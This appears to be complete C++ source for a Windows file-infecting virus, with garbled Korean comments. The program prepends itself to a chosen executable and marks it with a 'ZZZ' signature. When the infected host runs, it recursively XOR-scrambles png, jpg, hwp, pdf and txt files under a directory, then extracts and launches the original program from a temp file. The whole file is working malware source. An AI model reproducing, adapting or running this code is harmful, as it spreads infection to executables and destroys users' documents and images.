//xls, .doc, .pdf, .jpg, .avi, .rar, .zip, .mp4, .png, .psd, .hwp[25], .java, .js, c, cpp(cc), cs, py
#define _CRT_SECURE_NO_WARNINGS
#include<iostream>
#include<Windows.h>
#include<ShlObj_core.h>
#include<fstream>

#define PATH_SIZE 1024
#define MAX 10000000
enum SEARCH_MODE { DIRECTORY, FILET };

void SearchFile(const char* path, const char* ext, SEARCH_MODE search); //���丮, ���� ����� Ž��
void FileDecoding(const char* path); //��ȣȭ, ��ȣȭ

DWORD get_fsize(const char* pth); //������ ������ ����
char* get_cur_file(); //�ڱ��ڽ��� ������ ��ȯ
char* get_tfile(); //�ӽ����� ��� �߱޹���
int IsInfected(const char* path);
int CheckMySelf();
void Extract_Original();
char* GetDirectory(const char* path);
void InfectProgram(const char* path);

const char* temporary_signature = "infect";
const char* signature = "ZZZ";

struct HYD_struct {
	DWORD fsize;

	char sign[4];
};

char* tchar2char(TCHAR* unicode)
{
	//TCHAR�� char�� ��ȯ�����ִ� �Լ�

	char* szRet = NULL;
	int len = ::WideCharToMultiByte(CP_ACP, 0, unicode, -1, szRet, 0, NULL, NULL);

	if (0 < len)
	{
		szRet = (char*)malloc(sizeof(char) * len);
		::ZeroMemory(szRet, len);

		::WideCharToMultiByte(CP_ACP, 0, unicode, -1, szRet, len, NULL, NULL);
	}

	return szRet;
}

int main(int argc, char** argv) {
	setlocale(LC_ALL, ""); //�ѱ��� �Է¹ޱ� ���� ���

	/*
	* ����ȭ�� ���� �ڵ�
	TCHAR Desctop_Path[PATH_SIZE];
	SHGetSpecialFolderPath(NULL, Desctop_Path, CSIDL_DESKTOP, FALSE); //����ȭ�� ��θ� �����´�

	char* path;
	path = tchar2char(Desctop_Path);
	strcpy(DesctopPath, path); //���������� �� ����

	printf("����ȭ�� ��� : %s\n", DesctopPath);

	char* InfectTargetPath = (char*)malloc(sizeof(char) * PATH_SIZE);
	sprintf(InfectTargetPath, "%s\\HYDhost.exe", path);

	printf("�������� ��� : %s\n", InfectTargetPath);	
	*/

	char InfectTargetPath[PATH_SIZE];

	char path[PATH_SIZE];

	int DoNotEndTheProgram;


	if (!CheckMySelf()) {
		printf("�ڱ��ڽ��� ���������� �ƴմϴ�.\n");
	}
	else {
		//�� ������ �ȵ���?
		//fseek�� ftell ������ ������ �����̴�

		printf("�ڱ��ڽ��� ���������Դϴ�\n");
		printf("��ȣȭ�� �����մϴ�\n");

		printf("��ȣȭ�ϰ��� �ϴ� ������ ������: \n\n");
		std::cin.getline(path, PATH_SIZE, '\n');
		//���� ���о��� �Է¹ޱ� ���� getline�� ����ߴ�

		SearchFile(path, "png", DIRECTORY);
		SearchFile(path, "png", FILET);
		SearchFile(path, "jpg", DIRECTORY);
		SearchFile(path, "jpg", FILET);
		SearchFile(path, "hwp", DIRECTORY);
		SearchFile(path, "hwp", FILET);
		SearchFile(path, "pdf", DIRECTORY);
		SearchFile(path, "pdf", FILET);
		SearchFile(path, "txt", DIRECTORY);
		SearchFile(path, "txt", FILET);		
		

		Extract_Original(); //�޺κ� ���� ���׼� ����

		//std::cin >> DoNotEndTheProgram;

		exit(1);
	}

	printf("������ų Ÿ�� ���α׷��� ������: \n\n");
	std::cin.getline(InfectTargetPath, PATH_SIZE, '\n');
	std::cout << "�ּ�: " << InfectTargetPath << std::endl;

	printf("Ÿ�� ���α׷� �������� Ȯ��...\n");
	
	if (IsInfected(InfectTargetPath)) {
		printf("Ÿ�� ���α׷� �̹� ������\n");
	}
	else {
		printf("Ÿ�� ���α׷� ������Ű����...\n");
		InfectProgram(InfectTargetPath);
	}

	//std::cin >> DoNotEndTheProgram;

	return 0;
}

void SearchFile(const char* path, const char* ext, SEARCH_MODE search) {
	WIN32_FIND_DATAA data;
	HANDLE hFind;
	char* newPath = (char*)malloc(sizeof(char) * PATH_SIZE);

	if (search == DIRECTORY) {
		sprintf(newPath, "%s\\*", path);
	}
	else {
		printf(".%s ã����\n", ext);
		sprintf(newPath, "%s\\*.%s", path, ext);
	}

	hFind = FindFirstFileA(newPath, &data);
	if (hFind == INVALID_HANDLE_VALUE) {
		return;
	}

	 do{
		if ((data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && !(data.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) && strcmp(data.cFileName, ".") && strcmp(data.cFileName, "..")) {
			std::cout << "���丮: " << std::string(data.cFileName) << std::endl;
			sprintf(newPath, "%s\\%s", path, std::string(data.cFileName).c_str());
			SearchFile(newPath, ext, DIRECTORY);
			SearchFile(newPath, ext, FILET);
			
		}
		else if ((search == FILET) && (data.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE) && !(data.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM)) {
			std::cout << "����: " << std::string(data.cFileName) << std::endl;
			sprintf(newPath, "%s\\%s", path, std::string(data.cFileName).c_str());

			FileDecoding(newPath);
			printf("%s ��ȣȭ/��ȣȭ �ϴ���\n", std::string(data.cFileName).c_str());
		}
	}while (FindNextFileA(hFind, &data));

	FindClose(hFind);
	free(newPath);
	return;
}

void FileDecoding(const char* path)
{
	//��ȣȭ & ��ȣȭ

	int key = 0x456789AB;

	FILE* file;
	fopen_s(&file, path, "rb");

	if (file == NULL) {
		printf("failed r");
		return;
	}

	int* buffer = (int*)malloc(sizeof(int) * MAX);
	int i = 0;

	while (1)
	{
		buffer[i] = fgetc(file);
		i++;
		if (feof(file) != 0) {
			break;
		}
	}

	fclose(file);


	fopen_s(&file, path, "wb");

	if (file == NULL) {
		printf("failed w");
		return;
	}

	for (int j = 0; j < i-1; j++) {
		fputc(buffer[j] ^ key, file);
	}

	fclose(file);

	free(buffer);
}

DWORD get_fsize(const char* pth)
{
	WIN32_FIND_DATAA fd;
	FindClose(FindFirstFileA(pth, &fd));
	//FindFirstFileA(pth, &fd);
	return fd.nFileSizeLow;
}

char* get_cur_file() {
	char* current = (char*)malloc(sizeof(char) * PATH_SIZE);
	GetModuleFileNameA(NULL, current, PATH_SIZE);
	return current;
}

char* get_tfile()
{

	char tmp_path[1024];
	char* t_pth = new char[1024];

	GetTempPathA(1024, tmp_path);

	GetTempFileNameA(tmp_path, temporary_signature, 1234, t_pth);
	return t_pth;

}

int IsInfected(const char* path) {
	FILE* ReadF;
	fopen_s(&ReadF, path, "rb");

	if (ReadF == NULL) {
		printf("������� ������ ã�� ���߽��ϴ�\n");
		return 1;
	}

	HYD_struct buffer;

	fseek(ReadF, get_fsize(path) - sizeof(HYD_struct), SEEK_SET); //���������� HYD_struct ����ü ����ŭ �̵�

	fread((void*)&buffer, 1, sizeof(HYD_struct), ReadF);

	fclose(ReadF);

	printf("buffer : %s\n", buffer.sign);
	printf("strcmp : %d\n", strcmp(buffer.sign, signature));

	if (!strcmp(buffer.sign, signature)) {
		return 1;
	}
	else {
		return 0;
	}
}

int CheckMySelf() {
	char* path = get_cur_file();

	FILE* ReadF;
	fopen_s(&ReadF, path, "rb");

	if (ReadF == NULL) {
		printf("�ڱ��ڽ��� ã�� ���߽��ϴ�\n");
		return 1;
	}
	printf("�ڱ��ڽ��� ������������ Ȯ���մϴ�\n");

	fseek(ReadF, get_fsize(path) - sizeof(HYD_struct), SEEK_SET); //���������� HYD_struct ����ü ����ŭ �̵�
	//sizeof(char) ��ŭ �� ����� �ϴ� ������?

	HYD_struct buffer;

	fread((void*)&buffer, 1, sizeof(HYD_struct), ReadF);

	fclose(ReadF);

	printf("buffer : %s\n", buffer.sign);
	printf("strcmp : %d\n", strcmp(buffer.sign, signature));

	free(path);

	if (!strcmp(buffer.sign, signature)) {
		return 1;
	}
	else {
		return 0;
	}
}

void Extract_Original() {
	char* tmp_file = get_tfile();
	char* cur = get_cur_file();
	FILE* ReadF;
	fopen_s(&ReadF, cur, "rb");

	if (ReadF == NULL) {
		printf("������� ������ ã�� ���߽��ϴ�\n");
		return;
	}

	FILE* WriteF;
	fopen_s(&WriteF, tmp_file, "wb");

	if (WriteF == NULL) {
		printf("������� ������ ã�� ���߽��ϴ�\n");
		fclose(ReadF);

		free(tmp_file);
		return;
	}

	HYD_struct Hstruct;
	int buffer;

	fseek(ReadF, get_fsize(cur) - sizeof(HYD_struct), SEEK_SET); //���������� HYD_struct ����ü ����ŭ �̵�
	//sizeof(char) ��ŭ �� ����� �ϴ� ������?
	printf("ftell before : %d\n", ftell(ReadF));
	fread((void*)&Hstruct, 1, sizeof(HYD_struct), ReadF);
	printf("ftell present : %d\n", ftell(ReadF));

	printf("Hstruct fsize : %d\n", Hstruct.fsize); //fsize �� �̻�

	fseek(ReadF, get_fsize(cur) - Hstruct.fsize - sizeof(HYD_struct) - 1, SEEK_SET); //���� ���� �ǳʶٰ� �б� ����
	//fseek���� ù��° �������� ��ġ(SEEK_SET)�� 0�̴�.

	printf("ftell after : %d\n", ftell(ReadF));

	while (ftell(ReadF) != get_fsize(cur) - sizeof(HYD_struct) - 1)
	{
		//ftell�� ���� �պκ� ����Ʈ ��ġ�� 0���� �����Ѵٴ� ���� ��������(1�� ���� ����)
		buffer = fgetc(ReadF);
		fputc(buffer, WriteF);
	}

	fclose(ReadF);
	fflush(WriteF);
	fclose(WriteF);

	//�ӽ����� �����ϱ�
	//startup(tmp_file);
	//ShellExecuteA(NULL, "open", tmp_file, NULL, NULL, SW_SHOWDEFAULT);
	//tmp ������ ����ȵ�. ���� ���� �� ����?

	printf("���� ���α׷� ������\n");
	WinExec(tmp_file, SW_NORMAL);

	//code injection ã�ƺ���
	free(tmp_file);
	free(cur);
}

char* GetDirectory(const char* path) {
	//���丮 ����
	int i = 0;
	int lastWpos = 0;
	char* InfectedDictionary = (char*)malloc(sizeof(char) * PATH_SIZE);
	while (1) {
		if (path[i] == '\0')
			break;
		if (path[i] == '\\')
			lastWpos = i;
		i++;
	}

	for (i = 0; i < lastWpos; i++) {
		InfectedDictionary[i] = path[i];
	}
	InfectedDictionary[i] = '\0';

	return InfectedDictionary;
}

void InfectProgram(const char* path) {
	char* tmp_file = get_tfile();
	char* cur = get_cur_file();
	int buffer;
	HYD_struct hs;

	FILE* ReadF;
	fopen_s(&ReadF, cur, "rb");

	if (ReadF == NULL) {
		printf("failed r");
		return;
	}

	FILE* WriteF;
	fopen_s(&WriteF, tmp_file, "wb");

	if (WriteF == NULL) {
		printf("failed w");
		fclose(ReadF);
		return;
	}

	printf("�ڱ��ڽ� �ӽ����Ϸ� ������...\n");
	while (1)
	{
		buffer = fgetc(ReadF);
		fputc(buffer, WriteF);
		if (feof(ReadF) != 0) {
			break;
		}
	}

	fflush(WriteF);
	fclose(ReadF);


	fopen_s(&ReadF, path, "rb");
	printf("�������� �ӽ����Ϸ� ������...\n");
	if (ReadF == NULL) {
		printf("failed r");
		return;
	}

	fseek(WriteF, 0L, SEEK_END);//������ �̵�
	//fseek SEEK_END�� ���� ������ �������� �ƴ϶� ������ ���� ǥ���ϱ� ���� ���ԵǴ� EOF�� �ǹ�

	while (1)
	{
		buffer = fgetc(ReadF);
		fputc(buffer, WriteF);
		if (feof(ReadF) != 0) {
			break;
		}
	}
	fflush(WriteF);
	fclose(ReadF);

	//HYD Struct ������ �߰�//
	fseek(WriteF, 0L, SEEK_END);

	hs.fsize = get_fsize(path); //���� ��� ���� ������ ����
	strcpy(hs.sign, signature);

	fwrite((void*)&hs, sizeof(HYD_struct), 1, WriteF);
	
	fflush(WriteF);	
	fclose(WriteF);
	

	printf("�ӽ����� �������Ͽ� �������...\n");

	CopyFileA(tmp_file, path, false);

	char* InfectDirectory = GetDirectory(path);
	
	printf("infectedDirectory: %s\n", InfectDirectory);

	char* Destination1 = (char*)malloc(sizeof(char) * PATH_SIZE);
	char* Destination2 = (char*)malloc(sizeof(char) * PATH_SIZE);


	sprintf(Destination1, "%s\\MSVCP140.dll", InfectDirectory);
	CopyFileA("MSVCP140.dll", Destination1, false);

	sprintf(Destination2, "%s\\VCRUNTIME140.dll", InfectDirectory);
	CopyFileA("VCRUNTIME140.dll", Destination2, false);
	
	printf("�����Ϸ�\n");

	free(InfectDirectory);
	free(Destination1);
	free(Destination2);
	free(tmp_file);
	free(cur);
}